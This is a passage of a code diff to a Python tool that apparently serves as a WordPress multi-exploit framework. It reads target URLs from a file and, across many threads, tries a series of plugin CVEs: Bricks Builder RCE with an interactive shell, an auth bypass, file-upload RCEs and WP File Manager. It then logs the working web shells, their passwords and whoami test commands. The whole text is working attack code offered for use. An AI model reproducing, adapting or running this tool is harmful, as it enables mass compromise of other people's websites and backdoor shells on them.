+                        response = self.session.post(target_url + path, json=element, timeout=10)
+                        output = response.json().get('data', {}).get('html', '')
+                        cleaned_output = output.replace("Exception: ", "")
+                        if cleaned_output:
+                            print(cleaned_output)
+                            break
+                    except:
+                        continue
+            except KeyboardInterrupt:
+                break
+    
+    def run_all_exploits(self, target_url):
+        """Run all exploits"""
+        print(f"\n{YELLOW}[*]{RESET} Testing exploits on: {target_url}")
+        
+        # Try Bricks Builder first (interactive shell)
+        print(f"\n  {BLUE}[▶]{RESET} Trying Bricks Builder (CVE-2024-25600)...")
+        nonce = self.fetch_bricks_nonce(target_url)
+        if nonce:
+            # Test if vulnerable
+            test_element = self.create_bricks_element(nonce)
+            for path in BRICKS_PATHS:
+                try:
+                    resp = self.session.post(target_url + path, json=test_element, timeout=10)
+                    if resp.status_code == 200 and 'SHELL_TEST_12345' in resp.text:
+                        print(f"  {GREEN}[✓]{RESET} Bricks Builder is vulnerable!")
+                        self.interactive_bricks_shell(target_url, nonce)
+                        return True, "Interactive shell opened"
+                except:
+                    continue
+        
+        # Try other exploits
         exploits = [
-            ("MPMF RCE", self.exploit_mpmf_rce),
-            ("Pix for WooCommerce RCE", self.exploit_pix_rce),
-            ("WooCommerce RCE", self.exploit_woocommerce_rce),
-            ("WP File Manager RCE", self.exploit_file_manager_rce),
+            ('CVE-2023-32243 (Auth Bypass)', self.exploit_cve_2023_32243),
+            ('CVE-2026-3891 (Pix for WooCommerce)', self.exploit_pix_woocommerce),
+            ('CVE-2024-50526 (MPMF RCE)', self.exploit_mpmf_rce),
+            ('CVE-2024-51793 (WooCommerce Upload)', self.exploit_woocommerce_upload),
+            ('CVE-2020-25213 (WP File Manager)', self.exploit_wp_file_manager),
         ]
         
         for exploit_name, exploit_func in exploits:
-            self.log(f"Trying {exploit_name}...", "INFO")
-            shell_url = exploit_func(target_url)
-            if shell_url:
-                # Final verification that shell actually works
-                if self.verify_shell(shell_url):
-                    result['shells'].append({
-                        'exploit': exploit_name,
-                        'url': shell_url,
-                        'password': SHELL_PASSWORD
-                    })
-                    result['success'] = True
-                    self.log(f"✅ SUCCESS! {exploit_name} gave working shell: {shell_url}", "EXPLOIT")
-                    break
-                else:
-                    self.log(f"Shell URL returned but not working: {shell_url}", "ERROR")
-        
-        if not result['success']:
-            self.log(f"❌ No working exploits found for {target_url}", "ERROR")
-        
-        return result
-
-    def scan_targets(self, targets, max_workers=5):
-        """Scan multiple targets in parallel"""
-        results = []
-        total = len(targets)
-        completed = 0
-        
-        self.log(f"Starting scan of {total} targets with {max_workers} threads", "INFO")
-        
-        with ThreadPoolExecutor(max_workers=max_workers) as executor:
-            future_to_target = {executor.submit(self.scan_target, target): target for target in targets}
+            print(f"\n  {BLUE}[▶]{RESET} Trying {exploit_name}...")
+            success, result = exploit_func(target_url)
             
-            for future in as_completed(future_to_target):
-                completed += 1
+            if success:
+                print(f"\n  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                print(f"  {GREEN}[✓] SUCCESS!{RESET} {exploit_name}")
+                print(f"  {GREEN}[✓] Result:{RESET} {result}")
+                print(f"  {GREEN}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━{RESET}")
+                return True, result
+        
+        return False, None
+
+def ascii_art():
+    color.print("""[yellow]
+   _______    ________    ___   ____ ___  __ __       ___   ___________ ____  ____
+  / ____/ |  / / ____/   |__ \ / __ \__ \/ // /      |__ \ / ____/ ___// __ \/ __ \\
+ / /    | | / / __/________/ // / / /_/ / // /_________/ //___ \/ __ \/ / / / / / /
+/ /___  | |/ / /__/_____/ __// /_/ / __/__  __/_____/ __/____/ / /_/ / /_/ / /_/ /
+\____/  |___/_____/    /____/\____/____/ /_/       /____/_____/\____/\____/\____/
+    [/yellow]""", style="bold")
+    print("Coded By: K3ysTr0K3R & Enhanced with Multiple CVEs")
+    print("Exploits: CVE-2024-25600 | CVE-2023-32243 | CVE-2026-3891 | CVE-2024-50526 | CVE-2024-51793 | CVE-2020-25213")
+    print("")
+
+def scan_file(target_file, threads):
+    with open(target_file, "r") as url_file:
+        urls = [url.strip() for url in url_file if url.strip()]
+        if not urls:
+            color.print("[bold bright_red][~][/bold bright_red] No URLs found in the file.")
+            return
+    
+    exploiter = WordPressExploiter()
+    results = []
+    
+    with alive_bar(len(urls), title="Scanning Targets", bar="smooth", enrich_print=False) as bar:
+        with ThreadPoolExecutor(max_workers=threads) as executor:
+            futures = {executor.submit(exploiter.run_all_exploits, url): url for url in urls}
+            
+            for future in as_completed(futures):
+                url = futures[future]
                 try:
-                    result = future.result(timeout=120)
-                    results.append(result)
-                    self.log(f"Progress: {completed}/{total} ({int(completed/total*100)}%)", "INFO")
+                    success, result = future.result(timeout=180)
+                    if success:
+                        results.append({'url': url, 'result': result})
+                        color.print(f"\n[bold bright_green][+][/bold bright_green] Success: {url}")
                 except Exception as e:
-                    self.log(f"Scan failed for {future_to_target[future]}: {str(e)}", "ERROR")
-                    results.append({'url': future_to_target[future], 'error': str(e), 'success': False})
+                    color.print(f"\n[bold bright_red][-][/bold bright_red] Failed: {url} - {str(e)}")
+                bar()
+    
+    # Save results
+    if results:
+        with open('exploit_results.txt', 'w') as f:
+            for result in results:
+                f.write(f"URL: {result['url']}\n")
+                f.write(f"Result: {result['result']}\n")
+                f.write("-" * 50 + "\n")
         
-        return results
-
-    def save_results(self, results, filename=None):
-        """Save results to file"""
-        if not filename:
-            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
-            filename = f"wp_exploit_results_{timestamp}.txt"
-        
-        with open(filename, 'w', encoding='utf-8') as f:
-            f.write("=" * 80 + "\n")
-            f.write("WORDPRESS EXPLOIT SCANNER RESULTS\n")
-            f.write(f"Scan started: {self.start_time.isoformat()}\n")
-            f.write(f"Scan completed: {datetime.now().isoformat()}\n")
-            f.write("=" * 80 + "\n\n")
-            
-            successful = [r for r in results if r.get('success')]
-            failed = [r for r in results if not r.get('success')]
-            
-            f.write(f"SUMMARY:\n")
-            f.write(f"- Total targets: {len(results)}\n")
-            f.write(f"- Successful exploits: {len(successful)}\n")
-            f.write(f"- Failed: {len(failed)}\n\n")
-            
-            if successful:
-                f.write("=" * 80 + "\n")
-                f.write("✅ SUCCESSFUL EXPLOITS\n")
-                f.write("=" * 80 + "\n\n")
-                
-                for result in successful:
-                    f.write(f"Target: {result['url']}\n")
-                    for shell in result['shells']:
-                        f.write(f"  Exploit: {shell['exploit']}\n")
-                        f.write(f"  Shell URL: {shell['url']}\n")
-                        f.write(f"  Password: {shell['password']}\n")
-                        f.write(f"  Test: {shell['url']}&cmd=whoami\n")
-                    f.write("\n" + "-" * 40 + "\n\n")
-            
-            if failed:
-                f.write("=" * 80 + "\n")
-                f.write("❌ FAILED TARGETS\n")
-                f.write("=" * 80 + "\n\n")
-                for result in failed:
-                    f.write(f"Target: {result['url']}\n")
-                    if 'error' in result:
-                        f.write(f"Error: {result['error']}\n")
-                    f.write("\n")
-        
-        print(f"\n{GREEN}[+]{RESET} Results saved to: {filename}")
-        return filename
-
-def banner():
-    banner_text = f"""
-{PINK}{BOLD}
-  _____   _____   ___ __ ___  __    ___ ___  ___  _ 
- / __\\ \\ / / __|_|_  )  \\_  )/ / __|_  ) _ \\/ _ \\/ |
- | (__\\ V /| _|___/ / () / // _ \\___/ /\\_, /\\_, /| |
- \\___| \\_/ |___| /___\\__/___\\___/  /___|/_/  /_/ |_|
-{RESET}
-  {PINK}{BOLD}AUTOMATED WORDPRESS EXPLOIT SCANNER{RESET}
-  {CYAN}Exploits: MPMF RCE | Pix for WooCommerce RCE | WooCommerce RCE | WP File Manager RCE{RESET}
-  {YELLOW}Fully automated - Actual shell verification included{RESET}
-"""
-    print(banner_text)
-
-def load_targets(filename):
-    """Load targets from file"""
-    targets = []
-    try:
-        with open(filename, 'r', encoding='utf-8') as f:
-            for line in f:
-                line = line.strip()
-                if line and not line.startswith('#'):
-                    if '://' not in line:
-                        line = 'http://' + line
-                    targets.append(line)
-    except Exception as e:
-        print(f"{RED}[!]{RESET} Error loading file: {e}")
-        return []
-    return targets
+        color.print(f"\n[bold bright_green][+][/bold bright_green] Results saved to exploit_results.txt")
 
 def main():
-    if os.name == "nt":
-        os.system("cls")
+    ascii_art()
+    
+    parser = argparse.ArgumentParser(description='WordPress Multi-Exploit Framework')
+    parser.add_argument('-u', '--url', help='Target URL to exploit')
+    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
+    parser.add_argument('-f', '--file', help='File containing URLs to scan')
+    
+    args = parser.parse_args()
+    
+    exploiter = WordPressExploiter()
+    
+    if args.url:
+        success, result = exploiter.run_all_exploits(args.url)
+        if not success:
+            color.print("[bold bright_red][~][/bold bright_red] No exploits succeeded")
+    elif args.file:
+        scan_file(args.file, args.threads)
     else:
-        os.system("clear")
-    
-    banner()
-    
-    # Get targets file
-    filename = input(f"\n{YELLOW}[?]{RESET} Enter filename with domains/URLs: ").strip()
-    
-    if not os.path.exists(filename):
-        print(f"{RED}[!]{RESET} File not found: {filename}")
-        return
-    
-    targets = load_targets(filename)
-    
-    if not targets:
-        print(f"{RED}[!]{RESET} No targets loaded")
-        return
-    
-    print(f"{GREEN}[+]{RESET} Loaded {CYAN}{len(targets)}{RESET} targets")
-    
-    # Get thread count
-    threads_input = input(f"{YELLOW}[?]{RESET} Threads (default 5, max 10): ").strip()
-    max_workers = int(threads_input) if threads_input.isdigit() else 5
-    max_workers = min(max_workers, 10)  # Limit to 10 to avoid rate limiting
-    
-    print(f"\n{BLUE}[*]{RESET} Starting automated scan with {CYAN}{max_workers}{RESET} threads...")
-    print(f"{YELLOW}[!]{RESET} Press Ctrl+C to stop\n")
-    
-    try:
-        scanner = WPExploitScanner()
-        results = scanner.scan_targets(targets, max_workers)
-        
-        # Save results
-        save_file = scanner.save_results(results)
-        
-        # Print final summary
-        print(f"\n{BLUE}{'='*60}{RESET}")
-        print(f"{GREEN}[+]{RESET} SCAN COMPLETE")
-        print(f"{BLUE}{'='*60}{RESET}")
-        
-        successful = [r for r in results if r.get('success')]
-        print(f"{GREEN}[+]{RESET} Successful exploits: {len(successful)}/{len(results)}")
-        
-        if successful:
-            print(f"\n{MAGENTA}[!]{RESET} WORKING SHELLS:")
-            for result in successful:
-                print(f"\n  {CYAN}Target:{RESET} {result['url']}")
-                for shell in result['shells']:
-                    print(f"    {GREEN}→{RESET} {shell['url']}")
-                    print(f"    {YELLOW}Password:{RESET} {shell['password']}")
-                    print(f"    {YELLOW}Test:{RESET} {shell['url']}&cmd=whoami")
-        else:
-            print(f"\n{RED}[!]{RESET} No working shells found")
-        
-        print(f"\n{CYAN}[*]{RESET} Results saved to: {save_file}")
-        
-    except KeyboardInterrupt:
-        print(f"\n{YELLOW}[!]{RESET} Scan interrupted by user")
-    except Exception as e:
-        print(f"{RED}[!]{RESET} Scan error: {e}")
-        import traceback
-        traceback.print_exc()
+        parser.print_help()
 
 if __name__ == "__main__":
     try:
         main()
     except KeyboardInterrupt:
-        print(f"\n{YELLOW}Exiting...{RESET}")
+        color.print("\n[bold bright_yellow][!][/bold bright_yellow] Interrupted by user")
     except Exception as e:
-        print(f"{RED}Fatal error: {e}{RESET}")
+        color.print(f"\n[bold bright_red][!][/bold bright_red] Fatal error: {e}")
